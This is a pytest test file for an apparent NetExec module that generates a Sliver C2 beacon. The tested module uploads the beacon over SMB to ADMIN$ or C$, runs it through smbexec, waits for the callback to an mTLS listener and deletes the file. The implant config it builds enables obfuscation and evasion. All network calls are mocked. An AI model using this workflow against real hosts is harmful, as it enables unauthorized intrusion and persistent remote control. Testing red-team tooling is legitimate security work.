# tests/test_sliver_exec.py
import pytest
import sys
import os
import inspect
from unittest.mock import Mock, patch, MagicMock, call

# Assuming the module is in the parent directory or adjust import path as needed
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sliver_exec import NXCModule
from nxc.helpers.misc import CATEGORY


@pytest.fixture
def mock_worker():
    mw = Mock()
    mw.submit_task = Mock()
    return mw


@pytest.fixture
def patch_get_worker(mock_worker, monkeypatch):
    """Patch NXCModule._get_shared_worker to return a reusable mock worker.

    Tests can configure `mock_worker.submit_task.return_value` or
    `mock_worker.submit_task.side_effect` to simulate different gRPC responses.
    """
    # Use monkeypatch.setattr with the fully-qualified attribute name
    monkeypatch.setattr('sliver_exec.NXCModule._get_shared_worker', lambda: mock_worker)
    return mock_worker

@pytest.fixture
def module_instance():
    module = NXCModule()
    module.config_path = "/fake/path/to/config.cfg"
    return module

@pytest.fixture
def mock_context():
    context = Mock()
    context.log = Mock()
    context.log.fail = Mock()
    context.log.warning = Mock()
    context.log.display = Mock()
    context.log.success = Mock()
    context.log.debug = Mock()
    context.conf = Mock(get=Mock(return_value="/fake/path/to/config.cfg"))
    return context

@pytest.fixture
def mock_module_options():
    return {
        "RHOST": "192.168.1.100",
        "RPORT": "443",
        "IMPLANT_BASE_PATH": "/tmp",
        "CLEANUP": "True",
        "OS": None,
        "ARCH": None,
        "SHARE": None,
        "PROFILE": None,
        "WAIT": "30",
        "FORMAT": "exe"
    }

@pytest.fixture
def mock_config_file(tmp_path):
    config_content = """[DEFAULT]
ca_certificate = fake_ca
certificate = fake_cert
private_key = fake_key
"""
    config_file = tmp_path / "config.cfg"
    config_file.write_text(config_content)
    return str(config_file)

@pytest.fixture
def mock_connection():
    connection = Mock()
    connection.host = "192.168.1.100"
    connection.server_os = "Windows Server 2019 (Build 17763)."
    connection.os_arch = "x64"
    connection.conn = Mock()
    connection.conn.setTimeout = Mock()
    connection.execute = Mock(return_value=True)
    return connection

class TestNXCModule:
    def test_init(self, module_instance):
        assert module_instance.name == "sliver_exec"
        assert module_instance.description == "Generates unique Sliver beacon and executes on target"
        assert module_instance.supported_protocols == ["smb"]
        assert module_instance.opsec_safe is False
        assert module_instance.multiple_hosts is False
        assert module_instance.category == CATEGORY.PRIVILEGE_ESCALATION

    def test_options_missing_required(self, mock_context, mock_module_options):
        del mock_module_options["RHOST"]
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("Either RHOST+RPORT OR PROFILE must be provided")

    def test_options_invalid_format(self, mock_context, mock_module_options):
        mock_module_options["FORMAT"] = "dll"
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("Only EXECUTABLE format supported. Use: exe")

    def test_options_invalid_rhost(self, mock_context, mock_module_options):
        mock_module_options["RHOST"] = "invalid.ip.address"
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("RHOST must be a valid IPv4 address: invalid.ip.address")

    def test_options_invalid_rport(self, mock_context, mock_module_options):
        mock_module_options["RPORT"] = "99999"
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("RPORT must be a valid port number (1-65535): 99999")

    def test_options_invalid_rport_non_numeric(self, mock_context, mock_module_options):
        mock_module_options["RPORT"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("RPORT must be a valid port number (1-65535): not-a-number")

    def test_options_unknown_option(self, mock_context, mock_module_options, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["UNKNOWN_OPTION"] = "value"
        module = NXCModule()
        with pytest.raises(SystemExit):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("Unknown option: UNKNOWN_OPTION")

    def test_options_valid(self, mock_context, mock_module_options, module_instance, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.rhost == "192.168.1.100"
        assert module_instance.rport == 443
        assert module_instance.cleanup is True
        assert module_instance.wait_seconds == 30
        assert module_instance.format == "EXECUTABLE"
        assert module_instance.extension == "exe"
        mock_context.conf.get.assert_called_once()

    

    def test_detect_os_arch_from_connection(self, mock_context, mock_connection, module_instance):
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"
        assert arch == "amd64"
        mock_context.log.info.assert_called_once_with("Using: Windows amd64")

    def test_detect_os_arch_from_options(self, mock_context, mock_module_options, module_instance, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["OS"] = "linux"
        mock_module_options["ARCH"] = "386"
        module_instance.options(mock_context, mock_module_options)
        os_type, arch = module_instance._detect_os_arch(mock_context, Mock())
        assert os_type == "linux"
        assert arch == "386"
        mock_context.log.display.assert_called_once_with("Using specified arch: 386")
        mock_context.log.info.assert_called_once_with("Using: Linux 386")

    def test_detect_os_arch_invalid(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Unsupported OS"
        with pytest.raises(SystemExit):
            module_instance._detect_os_arch(mock_context, mock_connection)
        mock_context.log.fail.assert_called_once()

    def test_detect_os_arch_unix_samba_as_linux(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Unix Samba Server"
        mock_connection.os_arch = "x64"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"
        assert arch == "amd64"
        mock_context.log.info.assert_called_once_with("Using: Linux amd64")

    def test_detect_os_arch_default_amd64(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Windows Server"
        mock_connection.os_arch = None  # No arch info available
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"
        assert arch == "amd64"  # Should default to amd64
        mock_context.log.info.assert_called_once_with("Using: Windows amd64")

    def test_generate_implant_name(self, module_instance):
        module_instance.extension = "exe"
        name = module_instance._generate_implant_name()
        assert name.startswith("implant_")
        assert name.endswith(".exe")
        assert len(name) == len("implant_") + 8 + len(".exe")

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_generate_sliver_implant_success(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock the default implant generation path
        mock_jobs_existing = [Mock(Protocol="tcp", Port=443, Name="mtls")]  # Existing listener for first check
        mock_jobs_listener = [Mock(Protocol="tcp", Port=443, Host="192.168.1.100")]  # Listener for second check
        mock_profiles = []  # No existing profiles
        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        call_count = 0
        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == 'connect':
                return None
            elif method == 'jobs':
                if call_count == 2:  # First jobs call - check for existing
                    return mock_jobs_existing
                elif call_count == 3:  # Second jobs call - get listener for c2_url
                    return mock_jobs_listener
                return []
            elif method == 'implant_profiles':
                return mock_profiles
            elif method == 'generate_implant':
                return mock_resp
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = None  # Use default path

        with pytest.raises(SystemExit):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        mock_worker.submit_task.assert_any_call('connect', mock_config_file)
        mock_worker.submit_task.assert_any_call('jobs')

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_generate_sliver_implant_with_profile_listener(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock profile with proper Config structure
        from sliver.pb.clientpb import client_pb2 as clientpb
        mock_profile = Mock()
        mock_profile.Name = "test-profile-name"
        mock_profile.Config = clientpb.ImplantConfig()
        mock_profile.Config.Name = "existing-profile"
        mock_profile.Config.GOOS = "windows"
        mock_profile.Config.GOARCH = "amd64"
        # Add a C2 entry to the config
        existing_c2 = mock_profile.Config.C2.add()
        existing_c2.URL = "mtls://old-host:443"
        existing_c2.Priority = 1
        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        # profile-only path should call implant_profiles and generate_implant
        mock_worker.submit_task.side_effect = lambda method, *args, **kwargs: {
            'connect': None,
            'implant_profiles': [mock_profile],
            'generate_implant': mock_resp
        }[method]

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = "test-profile-name"  # Use profile path

        implant_data = module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        assert implant_data == b"implant_bytes"
        mock_worker.submit_task.assert_any_call('connect', mock_config_file)
        mock_worker.submit_task.assert_any_call('implant_profiles')
        mock_worker.submit_task.assert_any_call('generate_implant', mock_worker.submit_task.call_args_list[-1][0][1])

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_generate_sliver_implant_default_listener_creation(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock no existing listener, then one after creation
        mock_jobs_empty = []
        mock_listener = Mock()
        mock_listener.Protocol = "tcp"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 443
        mock_jobs_with_listener = [mock_listener]

        # For the first check (existing listener check), need Protocol="tcp" and Name="mtls"
        mock_listener_tcp = Mock()
        mock_listener_tcp.Protocol = "tcp"
        mock_listener_tcp.Port = 443
        mock_listener_tcp.Name = "mtls"
        mock_jobs_with_tcp_listener = [mock_listener_tcp]

        # Mock no existing matching profiles
        mock_profiles = []

        mock_profile_resp = Mock()
        mock_profile_resp.Name = "nxc_default_12345678"
        mock_profile_resp.ID = "profile-id"

        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        call_count = 0
        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == 'connect':
                return None
            elif method == 'jobs':
                if call_count == 2:  # First jobs call - check for existing
                    return mock_jobs_empty
                elif call_count == 4:  # Second jobs call - after start_mtls_listener
                    return mock_jobs_with_listener
                return []
            elif method == 'implant_profiles':
                return mock_profiles
            elif method == 'start_mtls_listener':
                return None
            elif method == 'save_implant_profile':
                return mock_profile_resp
            elif method == 'generate_implant':
                return mock_resp
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = None

        with pytest.raises(SystemExit):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        mock_worker.submit_task.assert_any_call('connect', mock_config_file)
        mock_worker.submit_task.assert_any_call('jobs')

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_get_listener_c2_url_mtls(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_listener = Mock()
        mock_listener.ID = "test-listener-id"
        mock_listener.Protocol = "tcp"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 443

        mock_worker.submit_task.return_value = [mock_listener]

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"

        url = module_instance._get_listener_c2_url("test-listener-id")
        assert url == "mtls://192.168.1.100:443"
        mock_worker.submit_task.assert_called_once_with('jobs')

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_get_listener_c2_url_http(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_listener = Mock()
        mock_listener.ID = "test-listener-id"
        mock_listener.Protocol = "http"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 80

        mock_worker.submit_task.return_value = [mock_listener]

        url = module_instance._get_listener_c2_url("test-listener-id")
        assert url == "http://192.168.1.100:80"

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_get_listener_c2_url_listener_not_found(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_worker.submit_task.return_value = []

        with pytest.raises(ValueError, match="Listener ID nonexistent not found"):
            module_instance._get_listener_c2_url("nonexistent")

    def test_build_default_implant_config(self, module_instance):
        module_instance.format = "EXECUTABLE"

        ic = module_instance._build_default_implant_config("windows", "amd64", "test.exe", "mtls://192.168.1.100:443")

        assert ic.Name == "test.exe"
        assert ic.GOOS == "windows"
        assert ic.GOARCH == "amd64"
        assert ic.Format == 2  # EXECUTABLE enum value (from the test output showing Format: EXECUTABLE)
        assert ic.IsBeacon == True
        assert ic.BeaconInterval == 5 * 1_000_000_000
        assert ic.BeaconJitter == 3 * 1_000_000_000
        assert ic.Debug == False
        assert ic.ObfuscateSymbols == True
        assert ic.Evasion == True  # Windows specific
        assert len(ic.C2) == 1
        assert ic.C2[0].URL == "mtls://192.168.1.100:443"
        assert ic.C2[0].Priority == 0

    def test_build_default_implant_config_linux(self, module_instance):
        module_instance.format = "EXECUTABLE"

        ic = module_instance._build_default_implant_config("linux", "amd64", "test.exe", "mtls://192.168.1.100:443")

        assert ic.Evasion == False  # Linux should not have evasion

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_generate_sliver_implant_connection_error(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_worker.submit_task.side_effect = ValueError("Sliver config missing certificates")

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"

        with pytest.raises(SystemExit):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")

        mock_context.log.fail.assert_called_once()
        assert "Sliver config missing certificates" in mock_context.log.fail.call_args[0][0]

    def test_save_implant_to_temp(self, module_instance):
        implant_data = b"fake_implant_bytes"
        tmp_path = module_instance._save_implant_to_temp(implant_data)
        assert os.path.exists(tmp_path)
        with open(tmp_path, "rb") as f:
            assert f.read() == implant_data
        # Cleanup in test
        os.unlink(tmp_path)

    def test_determine_remote_paths_windows(self, module_instance):
        full_path, share, smb_path = module_instance._determine_remote_paths("windows", "test.exe")
        assert full_path == r"C:\Windows\Temp\test.exe"
        assert share == "ADMIN$"
        assert smb_path == "Windows\\Temp\\test.exe"

    def test_determine_remote_paths_linux(self, module_instance):
        module_instance.implant_base_path = "/tmp"
        full_path, share, smb_path = module_instance._determine_remote_paths("linux", "test.exe")
        assert full_path == "/linux_share_root/test.exe"
        assert share == "linux"
        assert smb_path == "test.exe"

    def test_determine_remote_paths_windows_custom_share(self, module_instance):
        module_instance.share_config = "C$"
        full_path, share, smb_path = module_instance._determine_remote_paths("windows", "test.exe")
        assert full_path == r"C:\Windows\Temp\test.exe"
        assert share == "C$"
        assert smb_path == "Windows\\Temp\\test.exe"

    def test_determine_remote_paths_linux_custom_share(self, module_instance):
        module_instance.implant_base_path = "/tmp"
        module_instance.share_config = "myshare"
        full_path, share, smb_path = module_instance._determine_remote_paths("linux", "test.exe")
        assert full_path == "/linux_share_root/test.exe"
        assert share == "myshare"
        assert smb_path == "test.exe"

    @patch('sliver_exec.os')
    def test_cleanup_local_temp(self, mock_os, module_instance):
        mock_os.path.exists.return_value = True
        mock_os.unlink = Mock()
        tmp_path = "/fake/tmp/path.exe"
        module_instance._cleanup_local_temp(tmp_path)
        mock_os.unlink.assert_called_once_with(tmp_path)

    def test_increase_smb_timeout(self, mock_connection, module_instance):
        module_instance._increase_smb_timeout(mock_connection)
        mock_connection.conn.setTimeout.assert_called_once_with(300)

    @patch('builtins.open', new_callable=MagicMock)
    def test_upload_implant_via_smbexec_success(self, mock_open, mock_context, mock_connection, module_instance):
        mock_open.return_value.__enter__.return_value.read.return_value = b"fake_bytes"
        mock_connection.execute.return_value = True
        mock_connection.conn.putFile = Mock()

        success = module_instance._upload_implant_via_smbexec(
            mock_context, mock_connection, "/fake/local", r"C:\Windows\Temp\test.exe", "ADMIN$", "windows"
        )
        assert success is True
        mock_context.log.info.assert_called_with("Uploading implant directly via SMB (putFile)...")
        mock_context.log.success.assert_called_with("Implant SMB upload complete")

    @patch('builtins.open', new_callable=MagicMock)
    def test_upload_implant_smb_path_stripping(self, mock_open, mock_context, mock_connection, module_instance):
        """Ensure Windows C:\\Windows\\ prefix is stripped (case-insensitive) to leading \\temp path."""
        # Prepare mocks
        mock_open.return_value.__enter__.return_value.read.return_value = b"fake_bytes"
        mock_connection.conn.putFile = Mock()

        # Lowercase c: path should be normalized to start with backslash + remainder
        remote = "c:\\windows\\temp\\test.exe"
        success = module_instance._upload_implant_via_smbexec(
            mock_context, mock_connection, "/fake/local", remote, "ADMIN$", "windows"
        )

        assert success is True
        # Verify putFile called with the expected smb_path (leading backslash preserved)
        called_args = mock_connection.conn.putFile.call_args[0]
        assert called_args[0] == "ADMIN$"
        assert called_args[1] == r"\temp\test.exe"

    @patch('builtins.open', new_callable=MagicMock)
    def test_upload_implant_via_smbexec_linux_success(self, mock_open, mock_context, mock_connection, module_instance):
        mock_open.return_value.__enter__.return_value.read.return_value = b"fake_bytes"
        mock_connection.execute.return_value = True
        mock_connection.conn.putFile = Mock()
        module_instance.smb_path = "test.exe"  # Set the smb_path that Linux upload uses

        success = module_instance._upload_implant_via_smbexec(
            mock_context, mock_connection, "/fake/local", "/linux_share_root/test.exe", "linux", "linux"
        )
        assert success is True
        mock_context.log.info.assert_called_with("Uploading implant directly via SMB (putFile)...")
        mock_context.log.success.assert_called_with("Implant SMB upload complete")

    def test_execute_implant_success(self, mock_context, mock_connection, module_instance):
        success = module_instance._execute_implant(mock_context, mock_connection, r"C:\Windows\Temp\test.exe", "windows")
        assert success is True
        mock_connection.execute.assert_called_once_with('cmd /c "C:\\Windows\\Temp\\test.exe"', methods=["smbexec"])

    def test_execute_implant_linux(self, mock_context, mock_connection, module_instance):
        success = module_instance._execute_implant(mock_context, mock_connection, "/tmp/test.exe", "linux")
        # SMB execute is not supported on Linux targets; should skip execution and return False
        assert success is False
        mock_connection.execute.assert_not_called()
        mock_context.log.fail.assert_called_once_with("SMB execute is not supported on Linux targets; skipping remote execution")

    def test_wait_and_cleanup(self, mock_context, mock_connection, module_instance):
        with patch.object(module_instance, '_wait_for_beacon', return_value=False):
            module_instance._wait_and_cleanup(mock_context, mock_connection, r"C:\Windows\Temp\test.exe", "windows", "test.exe")
        mock_context.log.display.assert_any_call("Beacon not detected within timeout — cleaning up anyway")
        mock_context.log.info.assert_any_call("Cleaned up remote implant")
        mock_connection.execute.assert_called_once_with('del /f /q "C:\\Windows\\Temp\\test.exe"', methods=["smbexec"])

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_wait_for_beacon_success(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_beacon = Mock(Name="implant_test123456.exe")
        mock_worker.submit_task.return_value = [mock_beacon]

        module_instance.config_path = mock_config_file
        result = module_instance._wait_for_beacon(mock_context, "implant_test123456", timeout=5)
        assert result is True
        mock_context.log.success.assert_called_once()

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_wait_for_beacon_polling_and_timeout(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        """Test that _wait_for_beacon correctly polls for beacons and respects timeout."""
        # Setup mocks
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_beacon = Mock(Name="implant_test123456.exe")
        mock_worker.submit_task.return_value = [mock_beacon]

        module_instance.config_path = mock_config_file

        # Test with 5 second timeout - should find beacon immediately
        result = module_instance._wait_for_beacon(mock_context, "implant_test123456", timeout=5)

        assert result is True
        mock_context.log.success.assert_called_once()

    @patch('sliver_exec.NXCModule._get_shared_worker')
    def test_wait_for_beacon_timeout_expires(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        """Test that _wait_for_beacon times out correctly when no beacon is found."""
        # Setup mocks
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_worker.submit_task.return_value = []  # Empty list - no beacons

        module_instance.config_path = mock_config_file

        # Test with 1 second timeout - should timeout quickly
        result = module_instance._wait_for_beacon(mock_context, "test.exe", timeout=1)

        assert result is False
        # Should not call success
        mock_context.log.success.assert_not_called()

    def test_build_ic_from_profile_incompatible(self, patch_get_worker, module_instance, mock_context, mock_config_file):
        """Profile platform mismatch should cause failure."""
        from sliver.pb.clientpb import client_pb2 as clientpb

        # Create a profile that targets linux/386 while host is windows/amd64
        mock_profile = Mock()
        mock_profile.Name = "p1"
        cfg = clientpb.ImplantConfig()
        cfg.GOOS = "linux"
        cfg.GOARCH = "386"
        mock_profile.Config = cfg

        # patch_get_worker is configured to return a mock worker; make implant_profiles return our profile
        patch_get_worker.submit_task.return_value = [mock_profile]

        module_instance.profile = "p1"
        module_instance.config_path = mock_config_file

        with pytest.raises(SystemExit):
            module_instance._build_ic_from_profile(mock_context, "windows", "amd64", "test.exe")

        mock_context.log.fail.assert_called_once_with("Profile incompatible with host")

    @patch('builtins.open', new_callable=MagicMock)
    def test_upload_implant_via_smbexec_failure(self, mock_open, mock_context, mock_connection, module_instance):
        # Simulate putFile raising an exception
        mock_open.return_value.__enter__.return_value.read.return_value = b"fake_bytes"
        def raise_put(*a, **k):
            raise Exception("put error")
        mock_connection.conn.putFile = Mock(side_effect=Exception("put error"))

        success = module_instance._upload_implant_via_smbexec(
            mock_context, mock_connection, "/fake/local", r"C:\\Windows\\Temp\\test.exe", "ADMIN$", "windows"
        )

        assert success is False
        mock_context.log.fail.assert_called()

    def test_wait_for_beacon_session_success(self, patch_get_worker, module_instance, mock_context, mock_config_file):
        """Ensure session-based detection returns True."""
        # beacons empty, sessions returns a matching session
        patch_get_worker.submit_task.side_effect = lambda method, *a, **k: [] if method == 'beacons' else [Mock(Name='implant_abc123')]

        module_instance.config_path = mock_config_file
        result = module_instance._wait_for_beacon(mock_context, 'implant_abc', timeout=3)
        assert result is True
        mock_context.log.success.assert_called()

    def test_build_ic_default_reuse_matching_profile(self, patch_get_worker, module_instance, mock_context):
        """If a matching default profile exists, it should be reused."""
        # Create a fake listener to build c2_url
        listener = Mock()
        listener.Protocol = 'tcp'
        listener.Host = '1.2.3.4'
        listener.Port = 443

        # Monkeypatch ensure_default_mtls_listener to return our listener
        module_instance._ensure_default_mtls_listener = Mock(return_value=listener)

        # Build an ic_local to match against
        module_instance.format = "EXECUTABLE"
        ic_local = module_instance._build_default_implant_config('windows', 'amd64', 'test.exe', 'mtls://1.2.3.4:443')

        # Create a matching profile with identical Config
        from sliver.pb.clientpb import client_pb2 as clientpb
        p = clientpb.ImplantProfile()
        p.Name = 'match'
        p.Config.CopyFrom(ic_local)

        # Make implant_profiles return our matching profile
        patch_get_worker.submit_task.side_effect = lambda method, *a, **k: [p] if method == 'implant_profiles' else None

        result_ic = module_instance._build_ic_default(mock_context, 'windows', 'amd64', 'test.exe')
        # Should return an ImplantConfig
        assert isinstance(result_ic, clientpb.ImplantConfig)

    def test_build_ic_default_save_profile_failure(self, patch_get_worker, module_instance, mock_context):
        """If saving a default profile fails, warn and continue using inline config."""
        listener = Mock()
        listener.Protocol = 'tcp'
        listener.Host = '1.2.3.4'
        listener.Port = 443
        module_instance._ensure_default_mtls_listener = Mock(return_value=listener)

        # implant_profiles returns empty list
        def side_effect(method, *a, **k):
            if method == 'implant_profiles':
                return []
            if method == 'save_implant_profile':
                raise Exception('save failed')
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.format = "EXECUTABLE"
        ic = module_instance._build_ic_default(mock_context, 'windows', 'amd64', 'test.exe')
        # Should still return an ImplantConfig despite save failure
        from sliver.pb.clientpb import client_pb2 as clientpb
        assert isinstance(ic, clientpb.ImplantConfig)

    def test_ensure_default_mtls_listener_address_in_use(self, patch_get_worker, module_instance, mock_context):
        """If start_mtls_listener raises 'address already in use', we should warn and continue."""
        # Configure _find_listener to return None first, then a listener
        calls = {'count': 0}

        def fake_find_listener(protocol=None, port=None, name=None):
            calls['count'] += 1
            if calls['count'] == 1:
                return None
            listener = Mock()
            listener.Protocol = 'tcp'
            listener.Host = '1.2.3.4'
            listener.Port = 443
            listener.Name = 'mtls'
            return listener

        module_instance._find_listener = fake_find_listener

        # Simulate start_mtls_listener raising "address already in use"
        def start_raise(host, port):
            raise Exception('Address already in use')

        patch_get_worker.submit_task.side_effect = lambda method, *a, **k: None
        module_instance._worker_submit = Mock(side_effect=lambda method, *a, **k: (_ for _ in ()).throw(Exception('Address already in use')) if method == 'start_mtls_listener' else None)

        try:
            listener = module_instance._ensure_default_mtls_listener(mock_context)
            assert listener is not None
        except Exception:
            pytest.fail('ensure_default_mtls_listener raised unexpectedly')

    def test_generate_sliver_implant_default_success(self, patch_get_worker, module_instance, mock_context, mock_config_file):
        """Test successful default implant generation path (no SystemExit)."""
        # Prepare mock response for generate_implant
        mock_resp = Mock()
        mock_resp.File = Mock()
        mock_resp.File.Data = b"okbytes"

        # submit_task should handle connect and generate_implant
        calls = {'jobs': 0}
        listener = Mock()
        listener.Protocol = 'tcp'
        listener.Port = 443
        listener.Name = 'mtls'

        def side_effect(method, *args, **kwargs):
            if method == 'connect':
                return None
            if method == 'jobs':
                calls['jobs'] += 1
                # First jobs call: no listeners; second call: return the listener created
                return [] if calls['jobs'] == 1 else [listener]
            if method == 'generate_implant':
                return mock_resp
            if method == 'implant_profiles':
                return []
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.format = 'EXECUTABLE'
        module_instance.profile = None

        data = module_instance._generate_sliver_implant(mock_context, 'windows', 'amd64', 'test.exe')
        assert data == b"okbytes"

    def test_run_beacon_end_to_end_mocked(self, module_instance, mock_context, mock_connection, tmp_path):
        """End-to-end run beacon flow with SMB upload/execute mocked to avoid sys.exit."""
        # Patch methods to avoid network or file-system dependencies
        module_instance._detect_os_arch = Mock(return_value=('windows', 'amd64'))
        module_instance._generate_sliver_implant = Mock(return_value=b'implantdata')
        module_instance._increase_smb_timeout = Mock()
        module_instance._upload_implant_via_smbexec = Mock(return_value=True)
        module_instance._execute_implant = Mock(return_value=True)
        module_instance._wait_and_cleanup = Mock()

        # Use a connection with host attribute
        conn = mock_connection
        conn.host = '10.0.0.1'

        # Ensure cleanup is False to skip cleanup branch
        module_instance.cleanup = False

        # Run - should not raise
        module_instance._run_beacon(mock_context, conn)

        # Assertions: upload and execute were called
        module_instance._upload_implant_via_smbexec.assert_called()
        module_instance._execute_implant.assert_called()

    def test_method_signatures(self, module_instance):
        """
        Test that method signatures match expected parameter counts.
        This helps catch issues where method calls pass incorrect number of arguments.
        """
        # Check key method signatures to ensure they match their call sites
        expected_signatures = {
            '_execute_implant': 4,  # context, connection, remote_path, os_type
            '_wait_for_beacon': 3,  # context, implant_name, timeout=30
            '_run_beacon': 2,       # context, connection
            '_detect_os_arch': 2,   # context, connection
        }

        for method_name, expected_params in expected_signatures.items():
            method = getattr(module_instance, method_name)
            sig = inspect.signature(method)
            actual_params = len(sig.parameters)
            assert actual_params == expected_params, (
                f"Method {method_name} has {actual_params} parameters, expected {expected_params}. "
                f"Signature: {sig}"
            )
